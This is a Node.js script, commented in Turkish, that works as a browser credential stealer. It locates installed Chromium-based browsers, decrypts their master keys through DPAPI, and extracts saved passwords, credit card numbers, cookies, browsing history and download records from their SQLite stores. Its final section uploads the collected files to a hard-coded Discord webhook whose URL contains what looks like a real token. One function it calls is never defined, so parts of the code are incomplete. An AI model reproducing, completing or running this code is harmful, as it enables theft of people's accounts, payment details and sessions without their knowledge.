const fs = require('fs');
const https = require('https');
const path = require('path');
const zlib = require('zlib');
const os = require('os');
const { execSync } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const homeDir = os.homedir();


  // compress ------------------------------------------------------------------------------------------------------------------------------------------------


function ensureDirectoryExists(directory) {
    if (!fs.existsSync(directory)) {
      fs.mkdirSync(directory, { recursive: true });
    }
  }
  
  function compressFiles(filePaths, targetFile) {
    ensureDirectoryExists(path.dirname(targetFile));
  
    const writeStream = fs.createWriteStream(targetFile);
    const gzip = zlib.createGzip();
  
    writeStream.on('finish', () => {
      console.log(`Tüm dosyalar sıkıştırıldı ve ${targetFile} konumuna kaydedildi.`);
    });
  
    writeStream.on('error', (err) => {
      console.error(`Hata: ${err.message}`);
    });
  
    const fileStreams = filePaths.map((filePath) => {
      const sourcePath = path.resolve(filePath);
      const readStream = fs.createReadStream(sourcePath);
  
      const compressedStream = readStream.pipe(gzip);
  
      return compressedStream;
    });
  
    const mergedStream = require('stream').PassThrough();
    fileStreams.forEach((fileStream) => fileStream.pipe(mergedStream));
  
    mergedStream.pipe(writeStream);
  }
  
  
  // const filePaths = [
  //   path.resolve(path.join(homeDir, 'Desktop'), '(2).json'),
  //   path.resolve(homeDir, path.join('Desktop', '15 mb 13-01.json')),
  //   path.resolve(homeDir, 'Desktop', 'bkm_acs_files.zip')
  // ];
  
  const targetFile = path.resolve(homeDir, 'out', 'dosyalar.gz');
  
  //compressFiles(filePaths, targetFile);

  // compress ------------------------------------------------------------------------------------------------------------------------------------------------








  const browsers = {
    amigo: getAppDataPath('Amigo', 'User Data'),
    torch: getAppDataPath('Torch', 'User Data'),
    kometa: getAppDataPath('Kometa', 'User Data'),
    orbitum: getAppDataPath('Orbitum', 'User Data'),
    'cent-browser': getAppDataPath('CentBrowser', 'User Data'),
    '7star': getAppDataPath('7Star', '7Star', 'User Data'),
    sputnik: getAppDataPath('Sputnik', 'Sputnik', 'User Data'),
    vivaldi: getAppDataPath('Vivaldi', 'User Data'),
    'google-chrome-sxs': getAppDataPath('Google', 'Chrome SxS', 'User Data'),
    'google-chrome': getAppDataPath('Google', 'Chrome', 'User Data'),
    'epic-privacy-browser': getAppDataPath('Epic Privacy Browser', 'User Data'),
    'microsoft-edge': getEdgeUserDataPath(),
    uran: getAppDataPath('uCozMedia', 'Uran', 'User Data'),
    yandex: getAppDataPath('Yandex', 'YandexBrowser', 'User Data'),
    brave: getAppDataPath('BraveSoftware', 'Brave-Browser', 'User Data'),
    iridium: getAppDataPath('Iridium', 'User Data')
  };
  
  function getAppDataPath(...paths) {
    let appData;
    if (os.platform() === 'win32') {
      appData = process.env.LOCALAPPDATA || process.env.APPDATA;
    } else if (os.platform() === 'darwin') {
      appData = path.join(process.env.HOME, 'Library', 'Application Support');
    } else {
      appData = process.env.XDG_CONFIG_HOME || path.join(process.env.HOME, '.config');
    }
    return path.join(appData, ...paths);
  }
  
  function getEdgeUserDataPath() {
    let userDataPath = '';
    const command = 'wmic process where name="msedge.exe" get executablepath';
  
    try {
      const output = execSync(command).toString().trim();
      const lines = output.split('\n');
  
      if (lines.length >= 2) {
        const executablePath = lines[1].trim();
        userDataPath = path.join(path.dirname(executablePath), 'User Data');
      }
    } catch (error) {
      console.error('Error while getting Microsoft Edge user data path:', error);
    }
  
    return userDataPath;
  }
  
  function getMasterKey(browserPath) {
    let masterKey = null;
    const localStatePath = path.join(browserPath, 'Local State');
  
    if (fs.existsSync(localStatePath)) {
      try {
        const localStateContent = fs.readFileSync(localStatePath, 'utf8');
        const localStateJSON = JSON.parse(localStateContent);
        const encryptedKey = localStateJSON['os_crypt']['encrypted_key'];
  
        if (encryptedKey) {
          const encryptedKeyBuffer = Buffer.from(encryptedKey, 'base64');
          let masterKeyBuffer;
  
          if (process.platform === 'win32') {
            // Windows için DPAPI ile şifre çözme işlemi
            const tempBuffer = encryptedKeyBuffer.slice(5);
            const encryptedKeySlice = Buffer.from(tempBuffer.buffer, tempBuffer.byteOffset, tempBuffer.length);
            masterKeyBuffer = decryptWindowsDPAPI(encryptedKeySlice);
          } else {
            // Diğer işletim sistemleri için basit bir offsetli kesim işlemi
            masterKeyBuffer = Buffer.from(encryptedKeyBuffer.buffer, encryptedKeyBuffer.byteOffset + 5, encryptedKeyBuffer.length - 5);
          }
  
          const decryptedKeyBuffer = decryptMasterKey(masterKeyBuffer);
          masterKey = decryptedKeyBuffer.toString('utf16le');
        }
      } catch (error) {
        console.error(`Error while getting master key from ${browserPath}:`, error);
      }
    }
  
    return masterKey;
  }
  
  
  function decryptWindowsDPAPI(encryptedData) {
    let decryptedData = null;
  
    try {
      const { dpapi } = require('node-dpapi');
      decryptedData = dpapi.decrypt(encryptedData);
    } catch (error) {
      console.error('Error while decrypting with Windows DPAPI:', error);
    }
  
    return decryptedData;
  }
  
  function decryptPassword(buffer, masterKey) {
    const iv = buffer.slice(3, 15);
    const payload = buffer.slice(15);
    const cipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    let decryptedPassword = cipher.update(payload, 'binary', 'utf8');
    decryptedPassword += cipher.final('utf8');
    return decryptedPassword;
  }
  
  function getLoginData(browserPath, profile, masterKey) {
    const loginDataPath = path.join(browserPath, profile, 'Login Data');
    if (!fs.existsSync(loginDataPath)) {
      return null;
    }
  
    let result = '';
    const db = new sqlite3.Database(loginDataPath);
    db.serialize(() => {
      db.each(
        'SELECT action_url, username_value, password_value FROM logins',
        (err, row) => {
          if (err) {
            console.error(err);
            return;
          }
  
          if (!row.action_url || !row.username_value || !row.password_value) {
            return;
          }
  
          const passwordBuffer = Buffer.from(row.password_value, 'base64');
          const password = decryptPassword(passwordBuffer, masterKey);
  
          result += `
            URL: ${row.action_url}
            Email: ${row.username_value}
            Password: ${password}
          `;
        }
      );
    });
  
    db.close();
    return result;
  }
  
  function getCreditCards(browserPath, profile, masterKey) {
    const creditCardsPath = path.join(browserPath, profile, 'Web Data');
    if (!fs.existsSync(creditCardsPath)) {
      return null;
    }
  
    let result = '';
    const db = new sqlite3.Database(creditCardsPath);
    db.serialize(() => {
      db.each(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        (err, row) => {
          if (err) {
            console.error(err);
            return;
          }
  
          if (!row.name_on_card || !row.expiration_month || !row.expiration_year || !row.card_number_encrypted) {
            return;
          }
  
          const cardNumberBuffer = Buffer.from(row.card_number_encrypted, 'base64');
          const cardNumber = decryptPassword(cardNumberBuffer, masterKey);
  
          result += `
            Name On Card: ${row.name_on_card}
            Card Number: ${cardNumber}
            Expires On: ${row.expiration_month} / ${row.expiration_year}
            Added On: ${new Date(row.date_modified * 1000)}
          `;
        }
      );
    });
  
    db.close();
    return result;
  }
  
  function getCookies(browserPath, profile, masterKey) {
    const cookiesPath = path.join(browserPath, profile, 'Cookies');
    if (!fs.existsSync(cookiesPath)) {
      return null;
    }
  
    let result = '';
    const db = new sqlite3.Database(cookiesPath);
    db.serialize(() => {
      db.each(
        'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        (err, row) => {
          if (err) {
            console.error(err);
            return;
          }
  
          if (!row.host_key || !row.name || !row.path || !row.encrypted_value) {
            return;
          }
  
          const cookieBuffer = Buffer.from(row.encrypted_value, 'base64');
          const cookie = decryptPassword(cookieBuffer, masterKey);
  
          result += `
            Host Key: ${row.host_key}
            Cookie Name: ${row.name}
            Path: ${row.path}
            Cookie: ${cookie}
            Expires On: ${row.expires_utc}
          `;
        }
      );
    });
  
    db.close();
    return result;
  }
  
  function getWebHistory(browserPath, profile) {
    const historyPath = path.join(browserPath, profile, 'History');
    if (!fs.existsSync(historyPath)) {
      return null;
    }
  
    let result = '';
    const db = new sqlite3.Database(historyPath);
    db.serialize(() => {
      db.each(
        'SELECT url, title, last_visit_time FROM urls',
        (err, row) => {
          if (err) {
            console.error(err);
            return;
          }
  
          if (!row.url || !row.title || !row.last_visit_time) {
            return;
          }
  
          result += `
            URL: ${row.url}
            Title: ${row.title}
            Visited Time: ${new Date(row.last_visit_time / 1000)}
          `;
        }
      );
    });
  
    db.close();
    return result;
  }
  
  function getDownloads(browserPath, profile) {
    const downloadsPath = path.join(browserPath, profile, 'History');
    if (!fs.existsSync(downloadsPath)) {
      return null;
    }
  
    let result = '';
    const db = new sqlite3.Database(downloadsPath);
    db.serialize(() => {
      db.each(
        'SELECT tab_url, target_path FROM downloads',
        (err, row) => {
          if (err) {
            console.error(err);
            return;
          }
  
          if (!row.tab_url || !row.target_path) {
            return;
          }
  
          result += `
            Download URL: ${row.tab_url}
            Local Path: ${row.target_path}
          `;
        }
      );
    });
  
    db.close();
    return result;
  }
  
  function saveResults(browserName, dataType, content) {
    const resultPath = path.join(browserName, `${dataType}.txt`);
    fs.writeFileSync(resultPath, content);
    console.log(`\t[*] Saved in ${resultPath}`);
  }
  
  function getInstalledBrowsers() {
    const installedBrowsers = [];
    for (const browser in browsers) {
      const browserPath = browsers[browser];
      if (fs.existsSync(browserPath)) {
        installedBrowsers.push(browser);
      }
    }
    return installedBrowsers;
  }
  
  function retrieveBrowserData() {
    const availableBrowsers = getInstalledBrowsers();
  
    availableBrowsers.forEach((browser) => {
      const browserPath = browsers[browser];
      const masterKey = getMasterKey(browserPath);
  
      console.log(`Getting Stored Details from ${browser}`);
  
      console.log('\t[!] Getting Saved Passwords');
      const savedPasswords = getLoginData(browserPath, 'Default', masterKey);
      saveResults(browser, 'Saved_Passwords', savedPasswords);
      console.log('\t------');
  
      console.log('\t[!] Getting Browser History');
      const browserHistory = getWebHistory(browserPath, 'Default');
      saveResults(browser, 'Browser_History', browserHistory);
      console.log('\t------');
  
      console.log('\t[!] Getting Download History');
      const downloadHistory = getDownloads(browserPath, 'Default');
      saveResults(browser, 'Download_History', downloadHistory);
      console.log('\t------');
  
      console.log('\t[!] Getting Saved Credit Cards');
      const savedCreditCards = getCreditCards(browserPath, 'Default', masterKey);
      saveResults(browser, 'Saved_Credit_Cards', savedCreditCards);
      console.log('\t------');
  
      console.log('\t[!] Getting Cookies');
      const browserCookies = getCookies(browserPath, 'Default', masterKey);
      saveResults(browser, 'Cookies', browserCookies);
      console.log('\t------');
  
      console.log(`\n[*] Finished extracting data from ${browser}`);
      console.log('==============================\n');
    });
  }
  
  retrieveBrowserData();








  // browser ------------------------------------------------------------------------------------------------------------------------------------------------


  function getChromeHistoryPath() {
    const homeDir = os.homedir();
    let historyPath = '';
  
    if (os.platform() === 'win32') {
      historyPath = `${homeDir}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History`;
    } else if (os.platform() === 'darwin') {
      historyPath = `${homeDir}/Library/Application Support/Google/Chrome/Default/History`;
    } else if (os.platform() === 'linux') {
      historyPath = `${homeDir}/.config/google-chrome/Default/History`;
    }
  
    return historyPath;
  }
  
  function getBrowserHistory() {
    const historyPath = getChromeHistoryPath();
  
    try {
      const history = fs.readFileSync(historyPath);
      return history.toString();
    } catch (error) {
      console.error(error);
      return null;
    }
  }

  const browserHistory = getBrowserHistory();
//console.log(browserHistory);
  // browser ------------------------------------------------------------------------------------------------------------------------------------------------

//passwd









//passwd
// string to file ------------------------------------------------------------------------------------------------------------------------------------------------

function stringToFile(content, filePath) {
  fs.writeFileSync(filePath, content);
  console.log(`Metin dosyası oluşturuldu: ${filePath}`);
}

let filePath = path.resolve(homeDir, 'hstry')


stringToFile(browserHistory, filePath);

// string to file ------------------------------------------------------------------------------------------------------------------------------------------------



// webhook ------------------------------------------------------------------------------------------------------------------------------------------------

function sendFileToWebhook(url, targetFile) {
  const boundary = '--------------------------' + Date.now().toString(16);

  const formData = `
--${boundary}\r
Content-Disposition: form-data; name="file"; filename="allah"\r
Content-Type: text/plain\r
\r
${fs.readFileSync(targetFile, 'utf-8')}\r
--${boundary}--
`;

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': Buffer.byteLength(formData),
    },
  };

  const req = https.request(url, options, (res) => {
    console.log(`Dosya gönderme isteği gönderildi, yanıt kodu: ${res.statusCode}`);
    // Yanıtı işleme devam edebilirsiniz...
  });

  req.on('error', (error) => {
    console.error('Dosya gönderme isteği gönderilirken bir hata oluştu:', error.message);
  });

  req.write(formData);
  req.end();
}

// Fonksiyonu kullanarak dosyayı webhook'a gönderme örneği
const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';


async function aaaa(params) {
  
  const chromeProfilePath = await exportChromePasswords();
  console.log('Chrome profil dizini:', chromeProfilePath);
  

  sendFileToWebhook(webhookUrl, filePath);
  sendFileToWebhook(webhookUrl, chromeProfilePath);
  
}

aaaa()
// webhook ------------------------------------------------------------------------------------------------------------------------------------------------
